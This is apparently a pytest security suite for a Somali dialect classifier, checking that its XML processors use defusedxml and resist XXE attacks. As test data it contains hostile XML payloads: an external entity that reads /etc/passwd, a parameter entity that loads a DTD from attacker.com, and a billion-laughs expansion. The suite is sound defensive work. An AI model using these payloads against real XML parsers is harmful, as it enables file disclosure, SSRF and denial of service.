"""
Security tests for XXE (XML External Entity) vulnerability protection.

Tests ensure that all XML parsing in the codebase is protected against:
- External entity attacks (file disclosure)
- Parameter entity attacks (SSRF)
- Billion laughs attacks (DoS)

Reference: OWASP A05:2021 - Security Misconfiguration
Issue: SEC-MED-002
"""

import bz2
import tempfile
from pathlib import Path

import pytest


class TestXXEProtection:
    """Test suite for XXE vulnerability protection."""

    # Malicious XML payloads
    XXE_EXTERNAL_ENTITY = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<corpus>
  <text>&xxe;</text>
</corpus>
"""

    XXE_PARAMETER_ENTITY = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<corpus>
  <text>test</text>
</corpus>
"""

    XXE_BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<corpus>
  <text>&lol3;</text>
</corpus>
"""

    LEGITIMATE_XML = """<?xml version="1.0"?>
<corpus id="somali-test">
  <text id="1">
    <page n="1">
      <sentence>
        <token>Test</token>
        <token>sentence</token>
        <token>in</token>
        <token>Somali</token>
      </sentence>
    </page>
  </text>
</corpus>
"""

    def test_wikipedia_processor_blocks_external_entity(self):
        """Test Wikipedia processor blocks external entity XXE attacks."""
        from defusedxml import ElementTree as ET
        from xml.etree.ElementTree import ParseError

        # Attempt to parse malicious XML with external entity
        with pytest.raises((ParseError, ValueError, ET.ParseError)) as exc_info:
            ET.fromstring(self.XXE_EXTERNAL_ENTITY)

        # Verify the error message indicates entity processing was blocked
        error_msg = str(exc_info.value).lower()
        assert any(
            keyword in error_msg
            for keyword in ["entity", "doctype", "forbidden", "not allowed", "disabled"]
        ), f"Expected entity-related error, got: {error_msg}"

    def test_wikipedia_processor_blocks_parameter_entity(self):
        """Test Wikipedia processor blocks parameter entity XXE attacks."""
        from defusedxml import ElementTree as ET
        from xml.etree.ElementTree import ParseError

        # Attempt to parse malicious XML with parameter entity
        with pytest.raises((ParseError, ValueError, ET.ParseError)) as exc_info:
            ET.fromstring(self.XXE_PARAMETER_ENTITY)

        # Verify the error message indicates entity processing was blocked
        error_msg = str(exc_info.value).lower()
        assert any(
            keyword in error_msg
            for keyword in ["entity", "doctype", "forbidden", "not allowed", "disabled"]
        ), f"Expected entity-related error, got: {error_msg}"

    def test_sprakbanken_processor_blocks_billion_laughs(self):
        """Test Språkbanken processor blocks billion laughs DoS attacks."""
        from defusedxml import ElementTree as ET
        from xml.etree.ElementTree import ParseError

        # Attempt to parse malicious XML with exponential entity expansion
        with pytest.raises((ParseError, ValueError, ET.ParseError)) as exc_info:
            ET.fromstring(self.XXE_BILLION_LAUGHS)

        # Verify the error message indicates entity processing was blocked
        error_msg = str(exc_info.value).lower()
        assert any(
            keyword in error_msg
            for keyword in ["entity", "doctype", "forbidden", "not allowed", "disabled"]
        ), f"Expected entity-related error, got: {error_msg}"

    def test_wikipedia_processor_parses_legitimate_xml(self):
        """Test Wikipedia processor successfully parses legitimate XML."""
        from defusedxml import ElementTree as ET

        # Parse legitimate XML without entities
        root = ET.fromstring(self.LEGITIMATE_XML)

        # Verify structure is parsed correctly
        assert root.tag == "corpus"
        assert root.get("id") == "somali-test"

        # Verify content extraction works
        text_elem = root.find(".//text")
        assert text_elem is not None
        assert text_elem.get("id") == "1"

        # Verify sentence parsing works
        tokens = [token.text for token in root.findall(".//token")]
        assert tokens == ["Test", "sentence", "in", "Somali"]

    def test_sprakbanken_processor_iterparse_blocks_xxe(self):
        """Test Språkbanken processor's iterparse blocks XXE attacks."""
        from defusedxml import ElementTree as ET
        from xml.etree.ElementTree import ParseError

        # Create temporary malicious XML file
        with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
            f.write(self.XXE_EXTERNAL_ENTITY)
            temp_path = Path(f.name)

        try:
            # Attempt to parse with iterparse (used in Språkbanken processor)
            with pytest.raises((ParseError, ValueError, ET.ParseError)) as exc_info:
                for event, elem in ET.iterparse(str(temp_path), events=["start", "end"]):
                    pass

            # Verify the error indicates entity processing was blocked
            error_msg = str(exc_info.value).lower()
            assert any(
                keyword in error_msg
                for keyword in ["entity", "doctype", "forbidden", "not allowed", "disabled"]
            ), f"Expected entity-related error, got: {error_msg}"
        finally:
            temp_path.unlink()

    def test_sprakbanken_processor_iterparse_parses_legitimate_xml(self):
        """Test Språkbanken processor's iterparse works with legitimate XML."""
        from defusedxml import ElementTree as ET

        # Create temporary legitimate XML file
        with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
            f.write(self.LEGITIMATE_XML)
            temp_path = Path(f.name)

        try:
            # Parse with iterparse
            events = []
            for event, elem in ET.iterparse(str(temp_path), events=["start", "end"]):
                events.append((event, elem.tag))

            # Verify parsing succeeded
            assert len(events) > 0
            assert ("start", "corpus") in events
            assert ("end", "text") in events
        finally:
            temp_path.unlink()

    def test_sprakbanken_processor_bz2_compressed_blocks_xxe(self):
        """Test Språkbanken processor blocks XXE in bz2-compressed XML."""
        from defusedxml import ElementTree as ET
        from xml.etree.ElementTree import ParseError

        # Create temporary malicious bz2-compressed XML file
        with tempfile.NamedTemporaryFile(suffix=".xml.bz2", delete=False) as f:
            compressed = bz2.compress(self.XXE_EXTERNAL_ENTITY.encode("utf-8"))
            f.write(compressed)
            temp_path = Path(f.name)

        try:
            # Attempt to parse bz2-compressed malicious XML
            with bz2.open(temp_path, "rt", encoding="utf-8") as xml_file:
                with pytest.raises((ParseError, ValueError, ET.ParseError)) as exc_info:
                    for event, elem in ET.iterparse(xml_file, events=["start", "end"]):
                        pass

            # Verify the error indicates entity processing was blocked
            error_msg = str(exc_info.value).lower()
            assert any(
                keyword in error_msg
                for keyword in ["entity", "doctype", "forbidden", "not allowed", "disabled"]
            ), f"Expected entity-related error, got: {error_msg}"
        finally:
            temp_path.unlink()

    def test_bbc_processor_sitemap_safe_from_xxe(self):
        """Test BBC processor's sitemap parsing is safe from XXE."""
        import warnings

        from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning

        # Suppress XML-as-HTML warning (expected behavior for security)
        warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

        # Malicious sitemap with XXE payload
        malicious_sitemap = """<?xml version="1.0"?>
<!DOCTYPE urlset [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<urlset>
  <url>
    <loc>&xxe;</loc>
  </url>
</urlset>
"""

        # Parse with html.parser (XXE-safe by default)
        soup = BeautifulSoup(malicious_sitemap, "html.parser")

        # Verify no file content is leaked (entity should not be expanded)
        loc = soup.find("loc")
        if loc:
            # html.parser escapes entities, preventing XXE attacks
            # The entity reference becomes &amp;xxe; (escaped ampersand)
            assert "root:" not in loc.text, "XXE attack leaked /etc/passwd content"
            # Accept either escaped entity or empty text
            assert (
                "&xxe" in loc.text or loc.text == ""
            ), f"Unexpected entity expansion: {loc.text}"

    def test_wikipedia_processor_integration(self):
        """Integration test: Wikipedia processor with legitimate Wikipedia dump structure."""
        from defusedxml import ElementTree as ET

        # Minimal Wikipedia dump structure
        wikipedia_xml = """<?xml version="1.0"?>
<mediawiki xmlns="http://www.mediawiki.org/xml/export-0.10/">
  <page>
    <title>Test Article</title>
    <ns>0</ns>
    <revision>
      <timestamp>2024-01-01T00:00:00Z</timestamp>
      <text xml:space="preserve">Test content in Somali language.</text>
    </revision>
  </page>
</mediawiki>
"""

        # Parse Wikipedia structure
        root = ET.fromstring(wikipedia_xml)
        assert root.tag.endswith("mediawiki")

        # Verify page parsing works
        page = root.find(".//{http://www.mediawiki.org/xml/export-0.10/}page")
        assert page is not None

        # Verify title extraction
        title = page.find(".//{http://www.mediawiki.org/xml/export-0.10/}title")
        assert title is not None
        assert title.text == "Test Article"

    def test_performance_no_regression(self):
        """Test that defusedxml does not significantly impact performance."""
        import time

        from defusedxml import ElementTree as ET

        # Large but legitimate XML (100 elements)
        large_xml = """<?xml version="1.0"?>
<corpus id="performance-test">
"""
        for i in range(100):
            large_xml += f"""  <text id="{i}">
    <page n="1">
      <sentence>
        <token>Word1</token>
        <token>Word2</token>
        <token>Word3</token>
      </sentence>
    </page>
  </text>
"""
        large_xml += "</corpus>"

        # Measure parsing time
        start = time.time()
        for _ in range(10):
            root = ET.fromstring(large_xml)
            assert root.tag == "corpus"
        elapsed = time.time() - start

        # Verify reasonable performance (should be < 1 second for 10 iterations)
        assert elapsed < 1.0, f"Parsing too slow: {elapsed:.3f}s (expected < 1.0s)"

    def test_defusedxml_imported_correctly(self):
        """Test that processors are using defusedxml, not standard xml.etree."""
        # Check Wikipedia processor imports
        from somali_dialect_classifier.ingestion.processors import wikipedia_somali_processor

        # Verify defusedxml is imported
        assert hasattr(
            wikipedia_somali_processor, "ET"
        ), "Wikipedia processor missing ET import"

        # Verify it's from defusedxml module
        ET = wikipedia_somali_processor.ET
        assert "defusedxml" in ET.__name__, f"ET should be from defusedxml, got {ET.__name__}"

        # Check Språkbanken processor imports
        from somali_dialect_classifier.ingestion.processors import (
            sprakbanken_somali_processor,
        )

        assert hasattr(
            sprakbanken_somali_processor, "ET"
        ), "Språkbanken processor missing ET import"

        ET_sprak = sprakbanken_somali_processor.ET
        assert (
            "defusedxml" in ET_sprak.__name__
        ), f"ET should be from defusedxml, got {ET_sprak.__name__}"


class TestXXEDocumentation:
    """Test that XXE protection is properly documented."""

    def test_wikipedia_processor_has_security_documentation(self):
        """Test Wikipedia processor docstring mentions XXE protection."""
        from somali_dialect_classifier.ingestion.processors.wikipedia_somali_processor import (
            WikipediaSomaliProcessor,
        )

        # Check module docstring
        module_doc = WikipediaSomaliProcessor.__module__
        import sys

        module = sys.modules[module_doc]
        doc = module.__doc__ or ""

        assert any(
            keyword in doc.lower() for keyword in ["xxe", "security", "defusedxml"]
        ), "Wikipedia processor module should document XXE protection"

    def test_sprakbanken_processor_has_security_documentation(self):
        """Test Språkbanken processor docstring mentions XXE protection."""
        from somali_dialect_classifier.ingestion.processors.sprakbanken_somali_processor import (
            SprakbankenSomaliProcessor,
        )

        # Check module docstring
        module_doc = SprakbankenSomaliProcessor.__module__
        import sys

        module = sys.modules[module_doc]
        doc = module.__doc__ or ""

        assert any(
            keyword in doc.lower() for keyword in ["xxe", "security", "defusedxml"]
        ), "Språkbanken processor module should document XXE protection"

    def test_bbc_processor_sitemap_has_security_documentation(self):
        """Test BBC processor _scrape_sitemap method documents XXE protection."""
        from somali_dialect_classifier.ingestion.processors.bbc_somali_processor import (
            BBCSomaliProcessor,
        )

        # Check _scrape_sitemap method docstring
        method_doc = BBCSomaliProcessor._scrape_sitemap.__doc__ or ""

        assert any(
            keyword in method_doc.lower() for keyword in ["xxe", "security", "html.parser"]
        ), "BBC sitemap method should document XXE protection"
